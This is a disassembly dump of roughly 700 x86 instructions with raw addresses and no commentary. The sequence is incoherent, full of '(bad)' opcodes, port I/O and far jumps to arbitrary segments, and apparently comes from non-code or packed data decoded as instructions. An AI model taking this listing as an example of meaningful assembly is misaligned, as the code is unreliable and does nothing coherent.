  41fe44:	fisubr WORD PTR [eax+ebx*2-0x28]
  41fe48:	xor    al,0x10
  41fe4a:	add    al,0x33
  41fe4c:	mov    BYTE PTR [edx+0x68],bh
  41fe4f:	in     al,0xee
  41fe51:	mov    ch,0x53
  41fe53:	lahf   
  41fe54:	mov    bl,0x11
  41fe56:	ficomp WORD PTR [esi+0x7ebdbc40]
  41fe5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe5d:	cli    
  41fe5e:	pop    esp
  41fe5f:	dec    esp
  41fe60:	push   ecx
  41fe61:	or     DWORD PTR [ecx+0x23],edx
  41fe64:	adc    edx,DWORD PTR fs:[edi-0x6b06d351]
  41fe6b:	mov    DWORD PTR [ebp+0x13a375d9],esi
  41fe71:	mov    ebp,0x6a5961e6
  41fe76:	in     al,0xa9
  41fe78:	jecxz  0x41fe35
  41fe7a:	and    eax,0xa924d68c
  41fe7f:	dec    esp
  41fe80:	jae    0x41fe34
  41fe82:	mov    ah,0x7c
  41fe84:	aaa    
  41fe85:	mul    bl
  41fe87:	in     al,dx
  41fe88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe89:	or     dh,BYTE PTR [ecx+0x3a]
  41fe8c:	adc    DWORD PTR [esi+0x0],ebx
  41fe8f:	in     eax,dx
  41fe90:	and    ebp,esi
  41fe92:	cmp    eax,0xd9ead2
  41fe97:	xor    DWORD PTR [edi+0x99023eb],edi
  41fe9d:	ds gs dec esp
  41fea0:	mov    ch,0x6c
  41fea2:	dec    edi
  41fea3:	push   esp
  41fea4:	cmp    eax,0x50a6109e
  41fea9:	gs (bad) 
  41feab:	out    dx,al
  41feac:	mov    ebx,0xed7cf820
  41feb1:	es mov ebx,0x46a01ac4
  41feb7:	push   ss
  41feb8:	push   ebx
  41feb9:	xchg   ebp,eax
  41feba:	add    BYTE PTR [eax],al
  41febc:	test   eax,0xff94c95e
  41fec1:	xchg   edi,eax
  41fec2:	std    
  41fec3:	jg     0x41fecf
  41fec5:	in     al,0x99
  41fec7:	pop    ecx
  41fec8:	mov    dl,0x74
  41feca:	ds out dx,al
  41fecc:	xor    al,0x7b
  41fece:	add    DWORD PTR [eax],eax
  41fed0:	xchg   BYTE PTR [edx],al
  41fed2:	add    BYTE PTR [eax],al
  41fed4:	dec    eax
  41fed5:	std    
  41fed6:	adc    BYTE PTR [ebp+0x3d],bh
  41fed9:	outs   dx,DWORD PTR ds:[esi]
  41feda:	inc    edx
  41fedb:	push   ax
  41fedd:	sub    DWORD PTR [ebp-0x5d9f7e2f],edx
  41fee3:	pop    ebp
  41fee4:	bound  esp,QWORD PTR [eax+0x525c618]
  41feea:	fisubr DWORD PTR [edx+0x1aa9d46f]
  41fef0:	fld    TBYTE PTR [ecx+esi*8+0x11]
  41fef4:	pop    esi
  41fef5:	jbe    0x41ff03
  41fef7:	push   ds
  41fef8:	ror    BYTE PTR [edi-0x42],1
  41fefb:	fidivr DWORD PTR [ebp+eax*2+0x7e]
  41feff:	pop    ecx
  41ff00:	les    esp,FWORD PTR ds:0x2761916b
  41ff06:	dec    eax
  41ff07:	mov    eax,ds:0x25575325
  41ff0c:	daa    
  41ff0d:	and    bh,bl
  41ff0f:	sar    BYTE PTR [edi],cl
  41ff11:	dec    esp
  41ff12:	out    dx,eax
  41ff13:	adc    DWORD PTR [edi+0x215a519d],eax
  41ff19:	add    al,0x4b
  41ff1b:	sbb    dh,dh
  41ff1d:	(bad)  
  41ff1e:	jmp    0xd13:0xe8827319
  41ff25:	mov    ebx,0x5931ff95
  41ff2a:	mov    eax,0x806a454
  41ff2f:	push   ds
  41ff30:	and    ch,BYTE PTR [ecx+0x53d275da]
  41ff36:	mov    bl,0xb3
  41ff38:	ds out 0xd,al
  41ff3b:	dec    esi
  41ff3c:	ret    0x76c8
  41ff3f:	mov    esi,0x9e706e5
  41ff44:	adc    dh,dh
  41ff46:	pusha  
  41ff47:	dec    ecx
  41ff48:	jecxz  0x41ffa8
  41ff4a:	cmp    eax,0xfde3e3a6
  41ff4f:	push   0xb040b983
  41ff54:	mov    al,ds:0x256ce2e7
  41ff59:	mov    edx,0x11e975f0
  41ff5e:	mov    dh,0x82
  41ff60:	bound  ecx,QWORD PTR [eax+0x6f]
  41ff63:	ja     0x41ff22
  41ff65:	push   edx
  41ff66:	ins    DWORD PTR es:[edi],dx
  41ff67:	cmc    
  41ff68:	and    al,0xbf
  41ff6a:	sbb    DWORD PTR [esp+esi*1+0x41b3ebdc],eax
  41ff71:	inc    ebp
  41ff72:	pusha  
  41ff73:	(bad)  
  41ff74:	repnz in eax,0x23
  41ff77:	mov    ds:0xb6bd2c1a,al
  41ff7c:	mov    ds:0xb2b7b7ff,eax
  41ff81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff82:	stos   DWORD PTR es:[edi],eax
  41ff83:	repnz dec DWORD PTR [ebx-0x29]
  41ff87:	or     al,0x8c
  41ff89:	and    eax,0x90cc5763
  41ff8e:	fwait
  41ff8f:	jmp    0x41ffd2
  41ff91:	or     al,0x8a
  41ff93:	les    ebx,FWORD PTR [ebx+0x10]
  41ff96:	push   edx
  41ff97:	jae    0x41ff1d
  41ff99:	sub    BYTE PTR [edi+0x75],ch
  41ff9c:	call   0x7d7f:0xd4cf4dd0
  41ffa3:	xchg   ebx,eax
  41ffa4:	retf   
  41ffa5:	int    0x28
  41ffa7:	shr    BYTE PTR [esp+eiz*2+0x5f],0xd6
  41ffac:	cmp    BYTE PTR [ebp-0x1c6a6aed],dl
  41ffb2:	lahf   
  41ffb3:	mov    ebx,0xc909fccc
  41ffb8:	mov    esp,0xf3569aca
  41ffbd:	or     eax,0xce22e84f
  41ffc2:	stc    
  41ffc3:	jo     0x41ffaf
  41ffc5:	jnp    0x41ffbc
  41ffc7:	lds    esp,FWORD PTR [edx+0x42]
  41ffca:	mov    ch,0x8
  41ffcc:	fdiv   st,st(0)
  41ffce:	push   eax
  41ffcf:	retf   
  41ffd0:	pop    esi
  41ffd1:	iret   
  41ffd2:	cdq    
  41ffd3:	pop    edx
  41ffd4:	xor    edx,DWORD PTR [esi]
  41ffd6:	addr16 sahf 
  41ffd8:	arpl   WORD PTR [eax+0x83937ed],bx
  41ffde:	inc    edi
  41ffdf:	adc    esi,ebx
  41ffe1:	repz in eax,dx
  41ffe3:	int3   
  41ffe4:	je     0x41ff92
  41ffe6:	pop    esi
  41ffe7:	xor    eax,0x71b23df8
  41ffec:	add    BYTE PTR [bp+di],bh
  41ffef:	mov    ecx,0xf959dbf2
  41fff4:	cld    
  41fff5:	(bad)  
  41fff6:	and    ecx,DWORD PTR [ecx+0x40]
  41fff9:	stos   BYTE PTR es:[edi],al
  41fffa:	add    esp,esp
  41fffc:	je     0x42007a
  41fffe:	dec    eax
  41ffff:	pusha  
  420000:	popa   
  420001:	in     eax,dx
  420002:	loopne 0x42002b
  420004:	inc    eax
  420005:	lahf   
  420006:	pop    ecx
  420007:	stos   BYTE PTR es:[edi],al
  420008:	add    ebx,DWORD PTR [ecx-0x3d]
  42000b:	pushf  
  42000c:	mov    dl,0xbb
  42000e:	lahf   
  42000f:	adc    ah,BYTE PTR [edx+0x5d]
  420012:	mov    DWORD PTR [edi],edx
  420014:	cmp    ecx,DWORD PTR [ebx]
  420016:	pusha  
  420017:	out    0x48,al
  420019:	imul   DWORD PTR [edi]
  42001b:	push   edx
  42001c:	out    0xa3,eax
  42001e:	xor    esi,esi
  420020:	dec    esi
  420021:	test   al,0x51
  420023:	lahf   
  420024:	sub    cl,BYTE PTR [eax+0x5f]
  420027:	push   0xa6c6b5e1
  42002c:	mov    ebx,0x134a51c6
  420031:	int3   
  420032:	mov    al,0x2
  420034:	mov    edx,DWORD PTR [edi+0x7c86fac0]
  42003a:	sbb    eax,0x1c7f13c4
  42003f:	in     al,dx
  420040:	mov    al,0x4
  420042:	adc    esp,esp
  420044:	jne    0x4200af
  420046:	arpl   di,di
  420048:	mov    esi,0x390217d2
  42004d:	sti    
  42004e:	das    
  42004f:	fidiv  DWORD PTR [esi]
  420051:	sbb    eax,DWORD PTR [esi+0x21]
  420054:	mov    al,ds:0x66af4a8d
  420059:	fadd   QWORD PTR [ebx-0x61cc82ce]
  42005f:	sbb    bh,BYTE PTR [ebx]
  420061:	jle    0x42008a
  420063:	sbb    DWORD PTR [ebx-0x5c],ebp
  420066:	out    dx,al
  420067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420068:	jb     0x4200a4
  42006a:	in     eax,dx
  42006b:	mov    ss,WORD PTR [esi-0x59]
  42006e:	jl     0x420057
  420070:	or     BYTE PTR [ebx+eax*8+0x67515884],bh
  420077:	jne    0x420013
  420079:	enter  0xe2a8,0x91
  42007d:	and    al,0x64
  42007f:	jnp    0x420097
  420081:	push   ecx
  420082:	and    eax,DWORD PTR [edi-0x1be88ece]
  420088:	es fdiv st,st(1)
  42008b:	jae    0x420037
  42008d:	mov    cl,0xe6
  42008f:	(bad)  
  420090:	mov    al,ds:0x804cb90e
  420095:	adc    edx,eax
  420097:	cmp    eax,0x73fe605c
  42009c:	test   BYTE PTR [ecx-0x71],bl
  42009f:	pop    es
  4200a0:	mov    bh,BYTE PTR [eax-0x5b3e33d4]
  4200a6:	or     eax,0xb6eead9
  4200ab:	mov    bh,BYTE PTR [eax+0x67]
  4200ae:	pop    es
  4200af:	into   
  4200b0:	cmp    DWORD PTR [edx],eax
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	pop    ds
  4200b4:	mov    ebp,0x2f01b3db
  4200b9:	cmp    edx,DWORD PTR [ecx-0x60]
  4200bc:	add    ebx,ebx
  4200be:	xchg   edx,eax
  4200bf:	mov    ah,0x71
  4200c1:	or     bh,bh
  4200c3:	mov    ecx,0x89764a59
  4200c8:	mov    BYTE PTR [eax-0x21],bl
  4200cb:	xor    ecx,DWORD PTR [edx]
  4200cd:	call   0x4f71:0x7e3e38cf
  4200d4:	out    dx,al
  4200d5:	push   ecx
  4200d6:	mov    cl,0xf
  4200d8:	sti    
  4200d9:	mov    DWORD PTR [ebp-0x44c9f962],edx
  4200df:	ror    BYTE PTR ds:0xb9661a5f,1
  4200e5:	mov    DWORD PTR [ebx+0x73241e3f],ecx
  4200eb:	test   eax,0x4ea03999
  4200f0:	or     al,0x15
  4200f2:	adc    al,0x95
  4200f4:	pop    edi
  4200f5:	jae    0x4200e8
  4200f7:	call   DWORD PTR [esi+0x31ecd57d]
  4200fd:	jmp    0x42011f
  4200ff:	push   ds
  420100:	jno    0x42015c
  420102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420103:	and    eax,0xb20a1b77
  420108:	inc    edx
  420109:	cli    
  42010a:	adc    ch,bl
  42010c:	cdq    
  42010d:	cmp    BYTE PTR [ecx-0x4],al
  420110:	repnz cli 
  420112:	repnz xchg cl,dh
  420115:	shr    BYTE PTR [edi],0x60
  420118:	(bad)  
  420119:	xchg   ebx,eax
  42011a:	sbb    eax,0x154cf1b4
  42011f:	adc    DWORD PTR [ebx+0x16],0x48521afe
  420126:	add    ah,dh
  420128:	sbb    BYTE PTR [ecx-0x375dba72],ch
  42012e:	jp     0x4200f1
  420130:	adc    bh,BYTE PTR [ebx-0xd]
  420133:	xor    dl,dl
  420135:	mov    DWORD PTR [edx-0x27],eax
  420138:	rol    BYTE PTR [ebx],cl
  42013a:	arpl   WORD PTR [esi-0x33],bp
  42013d:	ins    DWORD PTR es:[edi],dx
  42013e:	ja     0x420197
  420140:	push   eax
  420141:	add    edi,DWORD PTR cs:[ebx-0x2800ba29]
  420148:	enter  0xdb2b,0x7c
  42014c:	fidivr WORD PTR [ecx]
  42014e:	xchg   ebp,eax
  42014f:	movhps QWORD PTR [ebp-0x5746557f],xmm6
  420156:	cmp    ch,BYTE PTR [esi]
  420158:	out    0x84,eax
  42015a:	add    BYTE PTR [eax],al
  42015c:	mov    ebx,0x7d7539cf
  420161:	idiv   edi
  420163:	iret   
  420164:	std    
  420165:	mov    ecx,DWORD PTR [esi+0x7bc41d0f]
  42016b:	adc    edi,DWORD PTR [edx-0x79fffe83]
  420171:	add    al,BYTE PTR [eax]
  420173:	add    BYTE PTR [edi+0x516a6a0a],ah
  420179:	scas   al,BYTE PTR es:[edi]
  42017a:	stos   DWORD PTR es:[edi],eax
  42017b:	jmp    0x420108
  42017d:	and    eax,0xc95fd82d
  420182:	push   ds
  420183:	pop    eax
  420184:	push   ecx
  420185:	cld    
  420186:	push   ss
  420187:	xchg   esi,eax
  420188:	aam    0x67
  42018a:	(bad)
  42018f:	xor    dl,BYTE PTR [edx-0x50a0e0c]
  420195:	icebp  
  420196:	push   0xbc95fc98
  42019b:	mov    bh,0xb9
  42019d:	dec    ecx
  42019e:	pop    ecx
  42019f:	and    eax,0xee07bdee
  4201a4:	xchg   edx,eax
  4201a5:	or     ebp,DWORD PTR [ecx]
  4201a7:	ror    BYTE PTR [edx+0x44],1
  4201aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ab:	mov    cs,WORD PTR [eax-0x76]
  4201ae:	mov    esi,0xdeb86f1b
  4201b3:	cmp    bl,dh
  4201b5:	mov    dh,0x54
  4201b7:	ret    0x8e4b
  4201ba:	adc    DWORD PTR [esi-0x54],ecx
  4201bd:	jo     0x4201f0
  4201bf:	cli    
  4201c0:	pusha  
  4201c1:	fwait
  4201c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201c3:	aaa    
  4201c4:	sbb    al,0x12
  4201c6:	adc    BYTE PTR [edi-0x32531ad0],0xb8
  4201cd:	push   0xc9ccd451
  4201d2:	dec    ebp
  4201d3:	aad    0x5c
  4201d5:	loope  0x42016f
  4201d7:	dec    ecx
  4201d8:	ss dec ebp
  4201da:	es sub bh,cl
  4201dd:	push   esp
  4201de:	inc    edi
  4201df:	adc    BYTE PTR [edx],bl
  4201e1:	add    ah,BYTE PTR [edi-0x6ac4f4df]
  4201e7:	cmp    ebx,DWORD PTR ds:0x4ab7c567
  4201ed:	dec    eax
  4201ee:	push   0x7a326775
  4201f3:	dec    ebp
  4201f4:	call   0xa300:0x45d8ef2a
  4201fb:	or     BYTE PTR [ebp+0x2d],ah
  4201fe:	hlt    
  4201ff:	fist   DWORD PTR [esi+0x1d3d7f2f]
  420205:	mov    ah,BYTE PTR [ebp+0x7c53fb3c]
  42020b:	dec    ecx
  42020c:	push   DWORD PTR [edx+0x21]
  42020f:	jg     0x420279
  420211:	add    al,0xab
  420213:	sub    BYTE PTR [ebp+0x54],ch
  420216:	in     al,dx
  420217:	mov    fs,WORD PTR [ebx-0x13]
  42021a:	ficomp DWORD PTR [ecx]
  42021c:	jnp    0x4201e7
  42021e:	mov    eax,ds:0x1460b518
  420223:	nop
  420224:	xchg   ebp,eax
  420225:	adc    ch,al
  420227:	adc    dh,dh
  420229:	sub    BYTE PTR [ebp+0x422e3ff9],bl
  42022f:	in     al,dx
  420230:	mov    edi,ds
  420232:	pusha  
  420233:	out    dx,eax
  420234:	addr16 jl 0x4202a6
  420237:	cmp    ecx,DWORD PTR [ebx+0xac3e31e]
  42023d:	dec    esi
  42023e:	mov    ah,0xe8
  420240:	push   ecx
  420241:	push   0x647e955
  420246:	cmp    dh,BYTE PTR [edi-0x43678ee0]
  42024c:	in     eax,0x46
  42024e:	test   BYTE PTR [eax-0x18e630d2],dl
  420254:	mov    DWORD PTR [edx-0x26],edi
  420257:	sbb    al,0xdd
  420259:	or     bh,BYTE PTR [edi+0x3f528e4d]
  42025f:	fcomp  DWORD PTR [edi]
  420261:	mov    ah,0x97
  420263:	add    esi,DWORD PTR [esi]
  420265:	clc    
  420266:	push   eax
  420267:	pop    edi
  420268:	adc    eax,0xb29c9f8
  42026d:	mov    bl,BYTE PTR [ebx]
  42026f:	push   eax
  420270:	lock int 0x1f
  420273:	mov    esi,DWORD PTR [eax-0x6a999ee3]
  420279:	loope  0x420224
  42027b:	xchg   ebx,eax
  42027c:	xor    BYTE PTR [ebp+0x27],ch
  42027f:	popf   
  420280:	xlat   BYTE PTR ds:[ebx]
  420281:	jno    0x4202dd
  420283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420284:	sub    ebx,DWORD PTR [esi+ebp*4+0x79]
  420288:	in     eax,dx
  420289:	push   ecx
  42028a:	inc    ebx
  42028b:	(bad)  
  42028c:	jecxz  0x4202c0
  42028e:	mov    DWORD PTR [ebx-0x6b46786b],eax
  420294:	int    0xba
  420296:	fild   DWORD PTR [edi]
  420298:	jae    0x42029f
  42029a:	ins    BYTE PTR es:[edi],dx
  42029b:	icebp  
  42029c:	sbb    DWORD PTR [edx-0x1],esi
  42029f:	xchg   edi,eax
  4202a0:	(bad)  
  4202a1:	in     eax,dx
  4202a2:	leave  
  4202a3:	push   edx
  4202a4:	push   cs
  4202a5:	jecxz  0x4202c2
  4202a7:	fdiv   QWORD PTR [esi-0x11]
  4202aa:	xor    DWORD PTR [ebx-0x6d],ebp
  4202ad:	retf   0xa9a3
  4202b0:	mov    al,ds:0x96ef9b29
  4202b5:	pop    ebx
  4202b6:	dec    esi
  4202b7:	pop    es
  4202b8:	leave  
  4202b9:	js     0x420246
  4202bb:	cmp    BYTE PTR [esi+ebx*1+0x40],ah
  4202bf:	cwde   
  4202c0:	cdq    
  4202c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202c2:	jno    0x4202ed
  4202c4:	jg     0x7f7985d0
  4202ca:	jge    0x4202da
  4202cc:	rcl    BYTE PTR [edx-0x611d9bf5],0x9c
  4202d3:	mov    ds:0xca348023,al
  4202d8:	stc    
  4202d9:	xchg   edx,eax
  4202da:	pop    es
  4202db:	pushf  
  4202dc:	cld    
  4202dd:	fistp  DWORD PTR [eax]
  4202df:	push   es
  4202e0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e2:	mov    WORD PTR [eax+0x22a320ae],?
  4202e8:	stos   DWORD PTR es:[edi],eax
  4202e9:	in     al,dx
  4202ea:	mov    ds:0xe5737836,al
  4202ef:	test   DWORD PTR [ebx+0x205b35f],edx
  4202f5:	aad    0x85
  4202f7:	repnz inc edx
  4202f9:	in     eax,0x33
  4202fb:	mov    dh,0xa8
  4202fd:	mov    ?,WORD PTR gs:[ecx+esi*4-0x23]
  420302:	push   ebp
  420303:	push   eax
  420304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420305:	mov    ah,cl
  420307:	pop    eax
  420308:	xor    cl,BYTE PTR [edx]
  42030a:	loopne 0x42030b
  42030c:	sbb    edx,DWORD PTR [esi+0x23]
  42030f:	pop    es
  420310:	outs   dx,BYTE PTR ds:[esi]
  420311:	aam    0x26
  420313:	dec    ebx
  420314:	add    eax,0x84f9fb38
  420319:	ss ja  0x420302
  42031c:	inc    ebp
  42031d:	sub    al,0x65
  42031f:	out    0xac,eax
  420321:	nop
  420322:	cmp    DWORD PTR [edx+0x1e],ebp
  420325:	(bad)  
  420326:	cmp    ebp,DWORD PTR [edi-0x131a0286]
  42032c:	shl    DWORD PTR [eax-0x5b9d7529],0xe8
  420333:	mov    cl,0xd5
  420335:	repz push ds
  420337:	cmp    esi,edi
  420339:	adc    DWORD PTR [ebp-0x1011b531],eax
  42033f:	mov    dl,dh
  420341:	pop    eax
  420342:	dec    edi
  420343:	pop    esi
  420344:	repnz add BYTE PTR [edi+0x61],ah
  420348:	push   ebx
  420349:	sub    al,0xe9
  42034b:	jle    0x420309
  42034d:	pop    edx
  42034e:	mov    eax,ds:0x515defd
  420353:	push   esi
  420354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420355:	xor    esp,edx
  420357:	cmp    bh,BYTE PTR [eax+0x0]
  42035a:	push   ds
  42035b:	sub    al,0x73
  42035d:	pop    edi
  42035e:	shr    DWORD PTR [esi-0x4f],cl
  420361:	mov    edx,0xe0d7cce4
  420366:	pop    eax
  420367:	inc    ebx
  420368:	inc    ebx
  420369:	mov    bl,0x9b
  42036b:	cdq    
  42036c:	cpuid  
  42036e:	pop    esi
  42036f:	mov    bh,BYTE PTR [edx+ebx*2-0x44da2e5d]
  420376:	hlt    
  420377:	pusha  
  420378:	test   DWORD PTR [edi],edi
  42037a:	stc    
  42037b:	jmp    ebx
  42037d:	mov    bl,0xcf
  42037f:	jmp    0xb029:0x20fe0e80
  420386:	pop    edi
  420387:	jp     0x42031e
  420389:	fcomp  QWORD PTR [ebp+0x5]
  42038c:	ret    0xfa9b
  42038f:	pop    ebx
  420390:	mov    ds:0x88cdd253,al
  420395:	ret    0xadda
  420398:	jmp    0x4203d9
  42039a:	fwait
  42039b:	or     ebx,ebp
  42039d:	sub    al,0x8a
  42039f:	out    0xd5,al
  4203a1:	fmul   QWORD PTR [edi-0x7f]
  4203a4:	jae    0x4203ad
  4203a6:	mov    dh,0x7e
  4203a8:	push   DWORD PTR [esi+0x44]
  4203ab:	pop    ss
  4203ac:	out    dx,al
  4203ad:	clc    
  4203ae:	outs   dx,DWORD PTR ds:[esi]
  4203af:	scas   al,BYTE PTR es:[edi]
  4203b0:	and    BYTE PTR [ecx],ch
  4203b2:	shr    DWORD PTR [eax],0x6b
  4203b5:	adc    eax,0x24ebe40b
  4203ba:	mov    ss,WORD PTR [ebx-0x68]
  4203bd:	pushf  
  4203be:	inc    edx
  4203bf:	and    BYTE PTR [ebp+0x642f53c8],dh
  4203c5:	mov    esi,0xf14d3bbb
  4203ca:	mov    bl,0x73
  4203cc:	pushf  
  4203cd:	int    0x94
  4203cf:	cmp    DWORD PTR [ebx],0x36b73322
  4203d5:	je     0x4203cc
  4203d7:	and    bh,ch
  4203d9:	sbb    ch,BYTE PTR [eax-0x50]
  4203dc:	hlt    
  4203dd:	bound  edi,QWORD PTR [ebx-0x3e]
  4203e0:	fist   DWORD PTR [edx+0x70201c8e]
  4203e6:	pop    edx
  4203e7:	add    dh,BYTE PTR [ecx]
  4203e9:	mov    ebp,0x6bd56a42
  4203ee:	out    0x4e,eax
  4203f0:	add    al,BYTE PTR [ebx]
  4203f2:	add    BYTE PTR [esi+0x1f],0x8c
  4203f6:	xor    ecx,DWORD PTR [ecx]
  4203f8:	fwait
  4203f9:	cmp    eax,DWORD PTR [eax]
  4203fb:	add    dh,ch
  4203fd:	ret    0x2d9d
  420400:	mov    ebp,0x3fc3fe7f
  420405:	out    dx,eax
  420406:	mov    edi,0x91f3e637
  42040b:	rol    DWORD PTR [eax-0x80],0x1
  42040f:	add    BYTE PTR [esi+0x52000002],al
  420415:	cmp    eax,0x15de787b
  42041a:	mov    dh,0xc9
  42041c:	add    esp,ecx
  42041e:	mov    ebx,0xcafe097e
  420423:	xchg   edi,eax
  420424:	xor    DWORD PTR [esi],0xd468dd8e
  42042a:	hlt    
  42042b:	aam    0x3c
  42042d:	push   0xffffffed
  42042f:	add    eax,0x3a0a58dd
  420434:	jae    0x42045f
  420436:	nop
  420437:	inc    edi
  420438:	int3   
  420439:	(bad)
  42043c:	add    eax,0xc5c6b3b
  420441:	adc    eax,0xd91896a7
  420446:	xor    eax,0x454adb3f
  42044b:	mov    ds,WORD PTR [esi-0x7f]
  42044e:	lahf   
  42044f:	xchg   ebp,eax
  420450:	into   
  420451:	pop    edx
  420452:	or     eax,0x3fbbe20d
  420457:	pushf  
  420458:	dec    ebp
  420459:	shl    DWORD PTR [ebp-0x75960c7c],cl
  42045f:	aaa    
  420460:	int    0x4b
  420462:	push   es
  420463:	aaa    
  420464:	adc    eax,0xecbbb470
  420469:	shr    BYTE PTR ds:[ebx-0x1e],cl
  42046d:	add    BYTE PTR [edx],al
  42046f:	(bad)  
  420470:	(bad)
  420476:	loop   0x420446
  420478:	mov    WORD PTR ds:0x447897f2,cs
  42047e:	retf   
  42047f:	imul   esi,ebp,0x617b6eb2
  420485:	iret   
  420486:	jmp    0x6135:0x3dbf97af
  42048d:	repnz shl dl,1
  420490:	and    BYTE PTR [edi],dh
  420492:	dec    ebx
  420493:	xchg   BYTE PTR [eax-0x4307b42f],al
  420499:	gs loopne 0x420494
  42049c:	out    dx,al
  42049d:	into   
  42049e:	enter  0xeee2,0xcd
  4204a2:	add    ah,bh
  4204a4:	cmp    ebx,DWORD PTR [edi+0x56c75a86]
  4204aa:	popa   
  4204ab:	and    ebx,DWORD PTR [edi+0x2e0dd229]
  4204b1:	sub    edi,DWORD PTR [ebx]
  4204b3:	call   0x4cd1:0xc289e652
  4204ba:	bound  ebp,QWORD PTR [esi-0x57c0d061]
  4204c0:	push   ebx
  4204c1:	adc    bh,0xbb
  4204c4:	aas    
  4204c5:	call   0x8869da6a
  4204ca:	push   0xffffffdf
  4204cc:	cmp    eax,0xe6c722c3
  4204d1:	loope  0x4204fb
  4204d3:	in     eax,0x1a
  4204d5:	xor    cl,dl
  4204d7:	out    0xe9,eax
  4204d9:	push   eax
  4204da:	push   esi
  4204db:	sub    esi,ebp
  4204dd:	fadd   DWORD PTR [edx]
  4204df:	mov    ah,0x38
  4204e1:	in     eax,0xd9
  4204e3:	fsub   QWORD PTR [ecx+esi*1-0x5063aa]
  4204ea:	mov    edi,0xd074492
  4204ef:	adc    ecx,ecx
  4204f1:	push   edx
  4204f2:	dec    ecx
  4204f3:	sbb    edx,edi
  4204f5:	pop    esi
  4204f6:	je     0x42056c
  4204f8:	inc    eax
  4204f9:	jo     0x420504
  4204fb:	mov    ds:0x2fd9a324,al
  420500:	mov    bh,0x9b
  420502:	loope  0x4204cf
  420504:	rol    BYTE PTR [esi-0x5aa60993],0xcf
  42050b:	mov    eax,ds:0x88ddea73
  420510:	fistp  WORD PTR [esi+ebx*2+0x250ff8b1]
  420517:	repz pop esp
  420519:	add    DWORD PTR ds:0xfd934fcb,esi
  42051f:	sbb    cl,BYTE PTR [ebx]
  420521:	in     eax,0xf
  420523:	ss jnp 0x42050f
  420526:	mov    esp,DWORD PTR [ecx-0xf]
  420529:	adc    BYTE PTR [esi-0x4f6d7f34],ch
  42052f:	add    edx,ebp
  420531:	in     eax,dx
  420532:	and    eax,0x107d862a
  420537:	xchg   DWORD PTR [eax+0x67],eax
  42053a:	sub    edx,ecx
  42053c:	test   eax,0xbab24bd
  420541:	mov    al,ds:0xabed58d2
  420546:	leave  
  420547:	and    al,BYTE PTR [edi]
  420549:	inc    ecx
  42054a:	enter  0x20e9,0xa0
  42054e:	mov    ebx,0x459edda3
  420553:	mov    WORD PTR [edi+0x6e],?
  420556:	sti    
  420557:	mov    ds:0xf72365f8,al
  42055c:	cmp    esp,0xffffff95
  42055f:	shl    BYTE PTR [edx-0x42fde68b],0x2
  420566:	mov    cl,0x98
  420568:	enter  0xca04,0x1f
  42056c:	bound  esp,QWORD PTR ds:0x1e645fd9
  420572:	xor    al,0x80
  420574:	(bad)  
  420575:	xlat   BYTE PTR ds:[ebx]
  420576:	push   eax
  420577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420578:	inc    edi
  420579:	mov    al,0x7e
  42057b:	outs   dx,DWORD PTR ds:[esi]
  42057c:	pop    ds
  42057d:	mov    bl,al
  42057f:	sbb    ch,0xe4
  420582:	mov    dl,0x5a
  420584:	mov    esi,0xe97ffa11
  420589:	ficomp DWORD PTR [edx-0x27]
  42058c:	hlt    
  42058d:	scas   al,BYTE PTR es:[edi]
  42058e:	in     eax,0x0
  420590:	jle    0x4205b0
  420592:	jno    0x420524
  420594:	mov    edi,0xc9f775b
  420599:	xchg   edx,eax
  42059a:	inc    esi
  42059b:	adc    BYTE PTR [edx],dl
  42059d:	enter  0xd232,0x70
  4205a1:	stos   DWORD PTR es:[edi],eax
  4205a2:	pushf  
  4205a3:	add    cl,BYTE PTR [edx]
  4205a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205a6:	mov    BYTE PTR [ebx+0x74],ah
  4205a9:	lea    edi,[edi]
  4205ab:	mov    ah,BYTE PTR [eax]
  4205ad:	test   ah,dl
  4205af:	outs   dx,DWORD PTR ds:[esi]
  4205b0:	test   BYTE PTR [ebx-0x1820c00c],0x72
  4205b7:	test   al,0xfc
  4205b9:	(bad)  
  4205ba:	rcl    BYTE PTR [edi],1
  4205bc:	es arpl dx,dx
  4205bf:	test   al,0x38
  4205c1:	xchg   edx,eax
  4205c2:	popf   
  4205c3:	add    DWORD PTR [ecx],esp
  4205c5:	xor    DWORD PTR [edx],edi
  4205c7:	pop    edx
  4205c8:	int3   
  4205c9:	aad    0x36
  4205cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205cc:	ror    BYTE PTR [ebp+0x16f0322],1
  4205d2:	mov    ebx,0xe8b95f9
  4205d7:	inc    esp
  4205d8:	or     DWORD PTR [ebx],eax
  4205da:	adc    BYTE PTR [esi+0x15bf9e9c],bh
  4205e0:	jae    0x4205ba
  4205e2:	sbb    eax,0x9f8177a6
  4205e7:	hlt    
  4205e8:	push   cs
  4205e9:	fidiv  DWORD PTR [ebx-0x3a]
  4205ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205ed:	outs   dx,DWORD PTR ds:[esi]
  4205ee:	lods   eax,DWORD PTR ds:[esi]
  4205ef:	xchg   BYTE PTR [edi],al
  4205f1:	lahf   
  4205f2:	fst    QWORD PTR [ecx]
  4205f4:	push   esi
  4205f5:	sbb    ah,ah
  4205f7:	(bad)  
  4205f9:	pop    ecx
  4205fa:	inc    ebx
  4205fb:	imul   ebx,DWORD PTR [ecx],0xffffffc0
  4205fe:	jbe    0x420646
  420600:	cld    
  420601:	test   DWORD PTR [ecx+ebx*1],0xe1279ae7
  420608:	in     eax,dx
  420609:	push   esp
  42060a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060b:	bound  ecx,QWORD PTR [ebx]
  42060d:	dec    edi
